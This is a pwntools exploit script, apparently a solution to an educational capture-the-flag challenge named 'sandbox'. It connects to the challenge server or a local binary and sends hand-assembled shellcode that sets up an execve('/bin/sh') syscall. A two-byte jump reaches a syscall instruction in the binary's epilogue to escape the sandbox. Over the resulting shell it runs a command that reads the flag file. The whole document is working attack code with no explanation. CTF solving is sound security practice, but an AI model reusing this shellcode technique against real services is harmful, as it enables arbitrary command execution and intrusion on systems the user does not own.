from pwn import *

HOST, PORT = 'edu-ctf.zoolab.org', 30202
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./sandbox/share/sandbox')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

payload = b''
payload += asm('''
xor rdx, rdx
xor rsi, rsi
mov rdi, 0x4002A
mov rax, 0x3B
''')
# jmp rel8 -> syscall in epilogue
payload += b'\xEB\x0F'
payload += b'/bin/sh\0'

io.send(payload)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
